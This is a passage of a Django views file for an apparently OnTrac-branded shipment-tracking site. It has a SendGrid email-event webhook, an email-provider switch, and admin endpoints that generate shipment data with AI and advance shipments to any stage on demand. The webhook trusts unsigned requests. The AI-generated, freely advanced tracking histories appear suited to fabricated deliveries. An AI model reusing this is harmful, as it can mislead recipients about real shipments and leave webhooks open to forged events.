        logger.error(f"Error checking ShieldClimb status: {str(e)}")
        return Response({
            'error': 'Failed to check payment status'
        }, status=status.HTTP_500_INTERNAL_SERVER_ERROR)


@csrf_exempt
def sendgrid_transactional_webhook(request):
    """
    Receives SendGrid transactional email events (open, click, delivered, etc.)
    for OnTrac shipment notification emails.
    """
    if request.method != 'POST':
        return HttpResponse(status=405)

    try:
        events = json.loads(request.body)

        with transaction.atomic():
            for data in events:
                event_type = data.get('event', '')
                recipient_email = data.get('email', '')
                sg_message_id = data.get('sg_message_id', '')
                subject = data.get('subject', '')

                status_map = {
                    'delivered': 'Delivered',
                    'open': 'Opened',
                    'click': 'Clicked',
                    'bounce': 'Bounced',
                    'dropped': 'Dropped',
                    'spamreport': 'Reported Spam',
                }
                status_text = status_map.get(event_type)
                if not status_text or not recipient_email or not sg_message_id:
                    continue

                cache_key = f"webhook_sg_trans_{sg_message_id}_{status_text}"
                try:
                    if cache.get(cache_key):
                        continue
                    cache.set(cache_key, True, 60)
                except Exception:
                    pass

                try:
                    shipment = Shipment.objects.filter(
                        recipient_email=recipient_email
                    ).latest('id')
                    SentEmail.objects.update_or_create(
                        provider_message_id=sg_message_id,
                        defaults={
                            'shipment': shipment,
                            'subject': subject,
                            'status': status_text,
                            'event_time': timezone.now()
                        }
                    )
                    print(f"✅ SendGrid transactional webhook: {sg_message_id} is now {status_text}")
                except Shipment.DoesNotExist:
                    print(f"Webhook (SendGrid Trans): Shipment for {recipient_email} not found.")

        return HttpResponse(status=200)

    except (json.JSONDecodeError, KeyError):
        return HttpResponse(status=400)
    except Exception as e:
        print(f"❌ Error processing SendGrid transactional webhook: {e}")
        return HttpResponse(status=500)


@api_view(['GET', 'POST'])
def email_provider_settings(request):
    """
    GET: Returns the currently active email provider.
    POST: Switches the active provider. Admin only.
    """
    if not request.user.is_authenticated or not request.user.is_staff:
        return Response({'error': 'Admin access required'}, status=status.HTTP_403_FORBIDDEN)

    settings_obj, _ = SiteSettings.objects.get_or_create(pk=1)

    if request.method == 'GET':
        return Response({
            'active_provider': settings_obj.email_provider,
            'available_providers': ['mailersend', 'resend']
        })

    if request.method == 'POST':
        new_provider = request.data.get('provider')
        valid = ['mailersend', 'resend', 'sendgrid']
        if new_provider not in valid:
            return Response(
                {'error': f'Invalid provider. Choose from: {valid}'},
                status=status.HTTP_400_BAD_REQUEST
            )
        settings_obj.email_provider = new_provider
        settings_obj.save()
        return Response({
            'message': f'Email provider switched to {new_provider} successfully.',
            'active_provider': new_provider
        })


@csrf_exempt
@api_view(['POST'])
def ai_generate_shipment(request):
    """
    Called by the ✦ AI Generate button in the admin form.
    Expects: { "destination_city": "Lagos", "destination_country": "Nigeria" }
    Returns: full shipment data JSON ready to populate form fields.
    Admin-only.
    """
    if not request.user.is_authenticated or not request.user.is_staff:
        return Response({'error': 'Admin access required'}, status=status.HTTP_403_FORBIDDEN)

    destination_city = request.data.get('destination_city', '').strip()
    destination_country = request.data.get('destination_country', '').strip()

    if not destination_city or not destination_country:
        return Response(
            {'error': 'Both destination_city and destination_country are required.'},
            status=status.HTTP_400_BAD_REQUEST
        )

    try:
        data = generate_shipment_data(destination_city, destination_country)
        return Response({'success': True, 'data': data}, status=status.HTTP_200_OK)
    except Exception as e:
        logger.error(f"AI generate error: {e}")
        return Response({'error': str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)


@csrf_exempt
@api_view(['POST'])
def ai_advance_stage(request):
    """
    Advances an existing shipment to the next stage OR jumps to a specific stage.
    Admin-only.
    """
    if not request.user.is_authenticated or not request.user.is_staff:
        return Response({'error': 'Admin access required'}, status=status.HTTP_403_FORBIDDEN)

    shipment_id = request.data.get('shipment_id')
    target_stage_key = request.data.get('target_stage_key', None)

    if not shipment_id:
        return Response({'error': 'shipment_id is required.'}, status=status.HTTP_400_BAD_REQUEST)

    try:
        shipment = Shipment.objects.get(pk=shipment_id)
    except Shipment.DoesNotExist:
        return Response({'error': f'Shipment {shipment_id} not found.'}, status=status.HTTP_404_NOT_FOUND)

    try:
        result = advance_shipment_stage(shipment, target_stage_key=target_stage_key)
        return Response({
            'success': True,
            'data': result,
            'stages_filled': result.get('_stages_added', 1),
            'message': result.get('_jumped_to_label', ''),
        }, status=status.HTTP_200_OK)
    except ValueError as e:
        return Response({'success': False, 'error': str(e)}, status=status.HTTP_400_BAD_REQUEST)
    except Exception as e:
        logger.error(f"AI advance stage error: {e}")
        return Response({'error': str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)


@api_view(['GET'])
def ai_stage_pipeline(request):
    """
    GET /api/admin/ai-stage-pipeline/?shipment_id=42
    Returns the full stage pipeline with is_current / is_completed / is_future markers.
    Admin-only.
    """
    if not request.user.is_authenticated or not request.user.is_staff:
        return Response({'error': 'Admin access required'}, status=status.HTTP_403_FORBIDDEN)

    shipment_id = request.query_params.get('shipment_id')
    if not shipment_id:
        return Response({'error': 'shipment_id is required.'}, status=status.HTTP_400_BAD_REQUEST)

    try:
        shipment = Shipment.objects.get(pk=shipment_id)
    except Shipment.DoesNotExist:
        return Response({'error': f'Shipment {shipment_id} not found.'}, status=status.HTTP_404_NOT_FOUND)

    try:
        pipeline = get_stage_pipeline_for_admin(shipment)
        return Response({'pipeline': pipeline})
    except Exception as e:
        return Response({'error': str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)